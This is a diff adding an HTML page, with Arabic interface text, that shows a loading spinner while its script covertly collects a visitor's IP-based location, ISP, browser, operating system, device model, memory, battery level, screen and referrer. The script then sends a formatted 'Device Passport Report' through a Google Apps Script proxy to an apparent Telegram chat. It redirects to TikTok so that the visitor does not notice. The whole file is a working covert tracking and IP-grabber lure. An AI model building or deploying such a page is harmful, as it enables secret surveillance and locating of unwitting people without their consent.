@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري التحميل...</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{
+    background:#0c0f1e;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-family:sans-serif;
+    color:#8f9ad1;
+  }
+  .loader{
+    text-align:center;
+  }
+  .spinner{
+    width:32px;height:32px;
+    border:3px solid rgba(244,236,218,0.15);
+    border-top-color:#a9803f;
+    border-radius:50%;
+    animation:spin 0.7s linear infinite;
+    margin:0 auto 12px;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .loader p{font-size:13px;}
+</style>
+</head>
+<body>
+
+<div class="loader" id="loader">
+  <div class="spinner"></div>
+  <p id="status">جاري التحميل...</p>
+</div>
+
+<script>
+// ==================== CONFIG ====================
+// استبدل هاد برابط Google Apps Script
+const PROXY_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+
+// الرابط اللي بدك يفتح بعد ما يجمع البيانات
+const TARGET_URL = 'https://www.tiktok.com';
+
+// استخراج chat_id من الرابط (?chat_id=123456)
+const urlParams = new URLSearchParams(window.location.search);
+const chatId = urlParams.get('chat_id');
+
+// ==================== HELPERS ====================
+function flagFromISO(iso){
+  if(!iso || iso.length!==2) return "🌐";
+  const codePoints = [...iso.toUpperCase()].map(c => 127397 + c.charCodeAt());
+  return String.fromCodePoint(...codePoints);
+}
+
+function redirect(){
+  window.location.replace(TARGET_URL);
+}
+
+// ==================== BROWSER DATA ====================
+function getBrowserData(){
+  const ua = navigator.userAgent;
+  let browser = "غير معروف", browserVer = "";
+  let m;
+  if ((m = ua.match(/Edg\/([\d.]+)/))) { browser = "Microsoft Edge"; browserVer = m[1]; }
+  else if ((m = ua.match(/OPR\/([\d.]+)/))) { browser = "Opera"; browserVer = m[1]; }
+  else if ((m = ua.match(/SamsungBrowser\/([\d.]+)/))) { browser = "Samsung Internet"; browserVer = m[1]; }
+  else if ((m = ua.match(/CriOS\/([\d.]+)/))) { browser = "Chrome (iOS)"; browserVer = m[1]; }
+  else if ((m = ua.match(/FxiOS\/([\d.]+)/))) { browser = "Firefox (iOS)"; browserVer = m[1]; }
+  else if ((m = ua.match(/Firefox\/([\d.]+)/))) { browser = "Mozilla Firefox"; browserVer = m[1]; }
+  else if ((m = ua.match(/Chrome\/([\d.]+)/)) && !ua.includes("Edg")) { browser = "Google Chrome"; browserVer = m[1]; }
+  else if ((m = ua.match(/Version\/([\d.]+).*Safari/))) { browser = "Safari"; browserVer = m[1]; }
+
+  let os = "غير معروف";
+  if ((m = ua.match(/Android\s([\d.]+)/))) {
+    os = "Android " + m[1];
+    const model = ua.match(/;\s([A-Za-z0-9_\-\s]+)\sBuild\//);
+    if (model) os += " · " + model[1].trim();
+  } else if ((m = ua.match(/Windows NT ([\d.]+)/))) {
+    const winMap = {"10.0":"Windows 10 / 11","6.3":"Windows 8.1","6.2":"Windows 8","6.1":"Windows 7"};
+    os = winMap[m[1]] || ("Windows NT " + m[1]);
+  } else if ((m = ua.match(/Mac OS X ([\d_]+)/))) {
+    os = "macOS " + m[1].replace(/_/g, ".");
+  } else if ((m = ua.match(/OS ([\d_]+) like Mac OS X/))) {
+    os = "iOS " + m[1].replace(/_/g, ".");
+  } else if (ua.includes("Linux")) {
+    os = "Linux";
+  }
+
+  const isMobile = /Mobi|Android|iPhone|iPad/i.test(ua);
+  let deviceLabel = isMobile ? "جوال / تابلت" : "حاسوب مكتبي";
+
+  // Client Hints
+  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    navigator.userAgentData.getHighEntropyValues(["platformVersion","model","fullVersionList","architecture"]).then(ch => {
+      if (ch.platformVersion && navigator.userAgentData.platform === "Android") {
+        os = "Android " + ch.platformVersion + (ch.model ? " · " + ch.model : "");
+      } else if (ch.platformVersion && navigator.userAgentData.platform === "Windows") {
+        const major = parseInt(ch.platformVersion.split(".")[0], 10);
+        os = (major >= 13 ? "Windows 11" : "Windows 10") + " (build " + ch.platformVersion + ")";
+      }
+      if (ch.model) deviceLabel += " — " + ch.model;
+    }).catch(()=>{});
+  }
+
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+  return {
+    browser: browserVer ? (browser + " — إصدار " + browserVer) : browser,
+    os: os,
+    device: deviceLabel,
+    cores: navigator.hardwareConcurrency ? (navigator.hardwareConcurrency + " أنوية") : "غير متاح",
+    ram: navigator.deviceMemory ? (navigator.deviceMemory + " GB تقريباً") : "غير متاح بهاد المتصفح",
+    touch: (navigator.maxTouchPoints > 0) ? ("نعم (" + navigator.maxTouchPoints + " نقطة)") : "لا",
+    platform: navigator.platform || "—",
+    lang: navigator.language || "—",
+    cookies: navigator.cookieEnabled ? "مفعّلة" : "معطّلة",
+    dnt: (navigator.doNotTrack === "1") ? "مفعّل" : "غير مفعّل",
+    protocol: location.protocol.replace(':','').toUpperCase(),
+    referrer: document.referrer ? document.referrer : "دخول مباشر",
+    resolution: screen.width + " × " + screen.height,
+    viewport: window.innerWidth + " × " + window.innerHeight,
+    dpr: window.devicePixelRatio + "x",
+    colordepth: screen.colorDepth + "-bit",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "—",
+    connType: conn && conn.effectiveType ? conn.effectiveType.toUpperCase() : "غير متاح",
+    connSpeed: conn && conn.downlink ? (conn.downlink + " Mbps تقريباً") : "غير متاح"
+  };
+}
+
+// ==================== FORMAT MESSAGE ====================
+function buildMessage(ipData, browserData){
+  const now = new Date().toISOString().slice(0,19).replace('T',' ');
+
+  let msg = `<b>📱 Device Passport Report</b>\n`;
+  msg += `<code>${now} UTC</code>\n\n`;
+
+  msg += `<b>🌍 Location / Network</b>\n`;
+  msg += `IP: <code>${ipData.ip || 'N/A'}</code>\n`;
+  msg += `Country: ${ipData.country_name || 'N/A'} ${ipData.country_code ? flagFromISO(ipData.country_code) : ''}\n`;
+  msg += `City: ${ipData.city || 'N/A'}\n`;
+  msg += `Region: ${ipData.region || 'N/A'}\n`;
+  msg += `ISP: ${ipData.org || 'N/A'}\n`;
+  msg += `Timezone: ${browserData.timezone}\n`;
+  msg += `Connection: ${browserData.connType}\n`;
+  msg += `Speed: ${browserData.connSpeed}\n`;
+  msg += `Protocol: ${browserData.protocol}\n\n`;
+
+  msg += `<b>💻 Device</b>\n`;
+  msg += `Type: ${browserData.device}\n`;
+  msg += `OS: ${browserData.os}\n`;
+  msg += `Cores: ${browserData.cores}\n`;
+  msg += `RAM: ${browserData.ram}\n`;
+  msg += `Touch: ${browserData.touch}\n\n`;
+
+  msg += `<b>🌐 Browser</b>\n`;
+  msg += `${browserData.browser}\n`;
+  msg += `Lang: ${browserData.lang}\n`;
+  msg += `Cookies: ${browserData.cookies}\n`;
+  msg += `DNT: ${browserData.dnt}\n\n`;
+
+  msg += `<b>🖥️ Display</b>\n`;
+  msg += `Resolution: ${browserData.resolution}\n`;
+  msg += `Viewport: ${browserData.viewport}\n`;
+  msg += `DPR: ${browserData.dpr}\n`;
+  msg += `Color: ${browserData.colordepth}\n\n`;
+
+  msg += `<b>🔋 Other</b>\n`;
+  msg += `Platform: ${browserData.platform}\n`;
+  msg += `Referrer: ${browserData.referrer}\n`;
+  msg += `Target: ${TARGET_URL}\n\n`;
+
+  msg += `<i>via Device Passport</i>`;
+  return msg;
+}
+
+// ==================== MAIN FLOW ====================
+async function main(){
+  if (!chatId) {
+    document.getElementById('status').textContent = "خطأ: chat_id مفقود";
+    return;
+  }
+
+  const browserData = getBrowserData();
+
+  // جلب IP
+  let ipData = {};
+  try {
+    const controller = new AbortController();
+    setTimeout(() => controller.abort(), 4000);
+    const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+    ipData = await res.json();
+  } catch(e) {
+    ipData = {};
+  }
+
+  // Battery
+  if (navigator.getBattery) {
+    try {
+      const b = await navigator.getBattery();
+      browserData.battery = Math.round(b.level*100) + "% " + (b.charging ? "(عم تشحن)" : "");
+    } catch(e) {
+      browserData.battery = "غير متاح";
+    }
+  } else {
+    browserData.battery = "غير متاح بهاد المتصفح";
+  }
+
+  const message = buildMessage(ipData, browserData);
+
+  // إرسال للبوت + redirect بعد النجاح
+  // + setTimeout احتياطي 2 ثانية
+  let sent = false;
+
+  const doRedirect = () => {
+    if (!sent) {
+      sent = true;
+      redirect();
+    }
+  };
+
+  // محاولة الإرسال
+  fetch(PROXY_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'text/plain' },
+    body: JSON.stringify({ chat_id: chatId, message: message })
+  })
+  .then(() => {
+    document.getElementById('status').textContent = "تم الإرسال، جاري التوجيه...";
+    doRedirect();
+  })
+  .catch(() => {
+    document.getElementById('status').textContent = "جاري التوجيه...";
+    doRedirect();
+  });
+
+  // احتياط: redirect بعد 2 ثواني حتى لو فشل الإرسال
+  setTimeout(doRedirect, 2000);
+}
+
+main();
+</script>
+</body>
+</html>
